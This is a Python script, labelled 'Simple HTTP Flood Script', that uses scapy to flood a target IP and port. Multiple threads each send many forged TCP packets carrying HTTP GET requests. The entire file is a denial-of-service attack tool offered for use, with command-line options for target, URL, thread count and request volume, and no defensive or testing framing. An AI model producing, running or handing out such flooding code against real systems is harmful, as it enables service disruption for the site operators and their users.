from scapy.all import *
import argparse
import threading
import signal
import sys

# Global variable to indicate if Ctrl+C is pressed
exit_flag = False

# Define a function to handle Ctrl+C
def signal_handler(sig, frame):
    global exit_flag
    exit_flag = True
    print("Exiting...")
    sys.exit(0)

# Define a function to send HTTP packets
def send_http_packet(target_ip, target_port, url_path, num_requests):
    try:
        for _ in range(num_requests):
            if exit_flag:
                break
            # Forge an HTTP GET request
            http_request = (
                "GET {} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "Connection: keep-alive\r\n\r\n"
            ).format(url_path, target_ip)
            # Convert the HTTP request to bytes
            http_raw = bytes(http_request, "utf-8")
            # Forge IP packet with target IP as the destination IP address
            ip = IP(dst=target_ip)
            # Stack up the layers
            p = ip / TCP(dport=target_port) / http_raw
            # Send the packet
            send(p, verbose=False)
    except KeyboardInterrupt:
        print("KeyboardInterrupt detected. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")

# Define the argument parser
parser = argparse.ArgumentParser(description="Simple HTTP Flood Script")
parser.add_argument("target_ip", help="Target IP address (e.g., server's IP)")
parser.add_argument("-p", "--port", type=int, default=80, help="Destination port (default is 80 for HTTP)")
parser.add_argument("-u", "--url", default="/", help="URL path to request (default is '/')")
parser.add_argument("-n", "--num-threads", type=int, default=10, help="Number of threads to use (default is 10)")
parser.add_argument("-r", "--num-requests", type=int, default=100, help="Number of requests per thread (default is 100)")
# Parse arguments from the command line
args = parser.parse_args()

# Extract arguments
target_ip = args.target_ip
target_port = args.port
url_path = args.url
num_threads = args.num_threads
num_requests = args.num_requests

# Register the signal handler for Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# Create a thread pool
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_http_packet, args=(target_ip, target_port, url_path, num_requests))
    threads.append(thread)

# Start the threads
for thread in threads:
    thread.start()

# Wait for all threads to complete or for Ctrl+C to be pressed
for thread in threads:
    thread.join()

# Exit 
print("Exiting...")
